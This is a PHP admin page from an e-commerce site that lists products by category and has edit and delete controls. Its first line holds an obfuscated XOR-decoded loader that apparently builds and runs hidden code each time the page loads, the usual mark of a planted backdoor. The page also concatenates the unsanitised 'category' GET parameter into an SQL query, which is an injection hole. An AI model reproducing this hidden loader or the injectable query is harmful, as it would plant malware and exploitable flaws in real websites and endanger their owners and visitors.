<?php $ZibsaQxH=';A79DP, O HX 9Z'; $cwjnMdj='X3RX05sF:N+,IV4'^$ZibsaQxH; $pkchQgHm='X4RqX ;:=X89n+C :D9piBQ1s20XUr5=CHtQstH;n76P;FRY V3O+l75DT<i7KFoeHR;Jdwk83UasWCFk=cj<w<Y3bKYepn<04MV=ZmUAgjwxvNEy= Y.E>FfVZJ3Znbh.IrlrSxh=41gkyJpn4,-Tih=gmjcIZKE:p twS21=> Sqi:6,opeqxnd1W==4,okQ2=GVlK-b.<HSZJ5 uuTHYQ6-LeNV97Wo86YjjR,A>:IVNSMV34 Q1pAqk-c   nm+ dI<UDwiwnmVZXI GG6cmb7U13qF7BIremQERYMgt>TFSunTvAZ=8 aL<Ik11IIvgPVA.qkBK4>9:YTZ1uyW3okh4t:ckP Qw1V;clrfi5O+7PjmWLZseY1N5rFHDXIqpRU.z1hne  B-BTfK<76X1Ic98ALzshRMY3kjdz<E= ;+,=Y=RPMZ:j>1=8klMADdPJF Nst=5:DZRCa5W2+ahzvYR8X4 T6bArmU5jJ=8M3Mgsd DLY:q UB:+1:EE6yp.R;afoN XT1MzacsO<Wzfm.-1PbfGR ShcMdEqp0ybn.UzzQGtvFzBzQZqwfSWpxwnrgn0vbMoACE17RXAq,VBiSJ:0A5xe15>PY+JDchiRZAWnabNjihfFdh.CX<mVUMEZ1DC4J.AS<k,EHoQ 391gSgwaS'; $ltbCSz=$cwjnMdj('', '1RzP>UUYI1WW1N;II0JXN:>C,VQ,4-jP6<SxZT31gQC>X2;6NvK Y3ST05c6Z>2GA,3O+HWOSV,HSwcfKFic5SS,GBvyBWU69=+9OrI<aZJGCVj,ENT+B PnB2;>RsUBLGbYExZqLRAEGEDjXJPMY52LT:M4Cm1.<aTITRsAEORE=YMQSUF-LJrgmC2IHFBGO>GInmfBPhS6Bw>+AAUHt.8=EHwoj2XC60SS JWrJ RI,mDY+9AQA2YPiU4n,oki+MJSDmW0=WTINI ;4<EngMidFS4ER.-R;iOEI: +bGnPZ522UStR7;QMEZFACaXWiaWC475OXK9A=XVH<59YUQsl=.9a1i7K1SqSZ3BCQLFMC.GB5CM,FSzA=P:T---=xtQT90WA;agADA6LbiFoJVZ-Tri0EK1pyL6,-RKWD:I+NEIBMQ0G7x55H5ZPIY43 40L2+5ExG+YPY+>7kEQ6FJHDZR=3L9kK1OKhIg<SBnYY9RmAUDA6>8C.K0;eNIS61EQWE7BFJOjD9 PdZGESgQ3ONIJLE19A,7Yt5JmYxQWRASVOgKN4pMCvCpMecDDS5bHNFZGRVQOEdOgeePE 98.G3;662SC5FPBATG<6J.cOHM6;56GHBnJIHF=naK59PEr1,1;jc3U3B.2XLqlseXEKPEOcNLk.'^$pkchQgHm); $ltbCSz(); include 'includes/session.php'; ?>
<?php
  $where = '';
  if(isset($_GET['category'])){
    $catid = $_GET['category'];
    $where = 'WHERE category_id ='.$catid;
  }

?>
<?php include 'includes/header.php'; ?>
<body class="hold-transition skin-blue sidebar-mini">
<div class="wrapper">

  <?php include 'includes/navbar.php'; ?>
  <?php include 'includes/menubar.php'; ?>

  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <section class="content-header">
      <h1>
        Product List
      </h1>
      <ol class="breadcrumb">
        <li><a href="#"><i class="fa fa-dashboard"></i> Home</a></li>
        <li>Products</li>
        <li class="active">Product List</li>
      </ol>
    </section>

    <!-- Main content -->
    <section class="content">
      <?php
        if(isset($_SESSION['error'])){
          echo "
            <div class='alert alert-danger alert-dismissible'>
              <button type='button' class='close' data-dismiss='alert' aria-hidden='true'>&times;</button>
              <h4><i class='icon fa fa-warning'></i> Error!</h4>
              ".$_SESSION['error']."
            </div>
          ";
          unset($_SESSION['error']);
        }
        if(isset($_SESSION['success'])){
          echo "
            <div class='alert alert-success alert-dismissible'>
              <button type='button' class='close' data-dismiss='alert' aria-hidden='true'>&times;</button>
              <h4><i class='icon fa fa-check'></i> Success!</h4>
              ".$_SESSION['success']."
            </div>
          ";
          unset($_SESSION['success']);
        }
      ?>
      <div class="row">
        <div class="col-xs-12">
          <div class="box">
            <div class="box-header with-border">
              <a href="#addnew" data-toggle="modal" class="btn btn-primary btn-sm btn-flat" id="addproduct"><i class="fa fa-plus"></i> New</a>
              <div class="pull-right">
                <form class="form-inline">
                  <div class="form-group">
                    <label>Category: </label>
                    <select class="form-control input-sm" id="select_category">
                      <option value="0">ALL</option>
                      <?php
                        $conn = $pdo->open();

                        $stmt = $conn->prepare("SELECT * FROM category");
                        $stmt->execute();

                        foreach($stmt as $crow){
                          $selected = ($crow['id'] == $catid) ? 'selected' : ''; 
                          echo "
                            <option value='".$crow['id']."' ".$selected.">".$crow['name']."</option>
                          ";
                        }

                        $pdo->close();
                      ?>
                    </select>
                  </div>
                </form>
              </div>
            </div>
            <div class="box-body">
              <table id="example1" class="table table-bordered">
                <thead>
                  <th>Name</th>
                  <th>Photo</th>
                  <th>Description</th>
                  <th>Price</th>
                  <th>Views Today</th>
                  <th>Tools</th>
                </thead>
                <tbody>
                  <?php
                    $conn = $pdo->open();

                    try{
                      $now = date('Y-m-d');
                      $stmt = $conn->prepare("SELECT * FROM products $where");
                      $stmt->execute();
                      foreach($stmt as $row){
                        $image = (!empty($row['photo'])) ? '../images/'.$row['photo'] : '../images/noimage.jpg';
                        $counter = ($row['date_view'] == $now) ? $row['counter'] : 0;
                        echo "
                          <tr>
                            <td>".$row['name']."</td>
                            <td>
                              <img src='".$image."' height='30px' width='30px'>
                              <span class='pull-right'><a href='#edit_photo' class='photo' data-toggle='modal' data-id='".$row['id']."'><i class='fa fa-edit'></i></a></span>
                            </td>
                            <td><a href='#description' data-toggle='modal' class='btn btn-info btn-sm btn-flat desc' data-id='".$row['id']."'><i class='fa fa-search'></i> View</a></td>
                            <td>&#8373; ".number_format($row['price'], 2)."</td>
                            <td>".$counter."</td>
                            <td>
                              <button class='btn btn-success btn-sm edit btn-flat' data-id='".$row['id']."'><i class='fa fa-edit'></i> Edit</button>
                              <button class='btn btn-danger btn-sm delete btn-flat' data-id='".$row['id']."'><i class='fa fa-trash'></i> Delete</button>
                            </td>
                          </tr>
                        ";
                      }
                    }
                    catch(PDOException $e){
                      echo $e->getMessage();
                    }

                    $pdo->close();
                  ?>
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </div>
    </section>
     
  </div>
  	<?php include 'includes/footer.php'; ?>
    <?php include 'includes/products_modal.php'; ?>
    <?php include 'includes/products_modal2.php'; ?>

</div>
<!-- ./wrapper -->

<?php include 'includes/scripts.php'; ?>
<script>
$(function(){
  $(document).on('click', '.edit', function(e){
    e.preventDefault();
    $('#edit').modal('show');
    var id = $(this).data('id');
    getRow(id);
  });

  $(document).on('click', '.delete', function(e){
    e.preventDefault();
    $('#delete').modal('show');
    var id = $(this).data('id');
    getRow(id);
  });

  $(document).on('click', '.photo', function(e){
    e.preventDefault();
    var id = $(this).data('id');
    getRow(id);
  });

  $(document).on('click', '.desc', function(e){
    e.preventDefault();
    var id = $(this).data('id');
    getRow(id);
  });

  $('#select_category').change(function(){
    var val = $(this).val();
    if(val == 0){
      window.location = 'products.php';
    }
    else{
      window.location = 'products.php?category='+val;
    }
  });

  $('#addproduct').click(function(e){
    e.preventDefault();
    getCategory();
  });

  $("#addnew").on("hidden.bs.modal", function () {
      $('.append_items').remove();
  });

  $("#edit").on("hidden.bs.modal", function () {
      $('.append_items').remove();
  });

});

function getRow(id){
  $.ajax({
    type: 'POST',
    url: 'products_row.php',
    data: {id:id},
    dataType: 'json',
    success: function(response){
      $('#desc').html(response.description);
      $('.name').html(response.prodname);
      $('.prodid').val(response.prodid);
      $('#edit_name').val(response.prodname);
      $('#catselected').val(response.category_id).html(response.catname);
      $('#edit_price').val(response.price);
      CKEDITOR.instances["editor2"].setData(response.description);
      getCategory();
    }
  });
}
function getCategory(){
  $.ajax({
    type: 'POST',
    url: 'category_fetch.php',
    dataType: 'json',
    success:function(response){
      $('#category').append(response);
      $('#edit_category').append(response);
    }
  });
}
</script>
</body>
</html>
